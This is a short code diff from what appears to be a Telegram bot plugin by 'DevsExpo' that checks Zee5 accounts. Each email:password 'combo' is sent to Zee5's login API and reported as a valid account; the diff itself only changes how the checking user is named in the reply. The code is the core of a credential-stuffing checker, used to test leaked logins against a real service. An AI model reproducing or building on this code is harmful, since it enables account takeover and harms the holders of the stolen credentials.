@@ -146,7 +146,6 @@ async def Devsexpo(event):
         meke = requests.get(
             f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
         ).json()
-        lol = await event.client(GetFullUserRequest(event.pattern_match.group(1)))
         beautifuln = f"""
 💖 **Checked Zee5 Account**
 **Combo:** {email}:{password}
@@ -154,7 +153,7 @@ async def Devsexpo(event):
 **Password:-** {password}
 **Response:-** This Account Is valid. 😀
 
-🔱 **Checked By:-** {lolu.user.username}
+🔱 **Checked By:-** {event.sender_id}
 
 **✅Better Luck Next Time, Thanks For Using Me. 
 Bot Made By @DevsExpo**"""
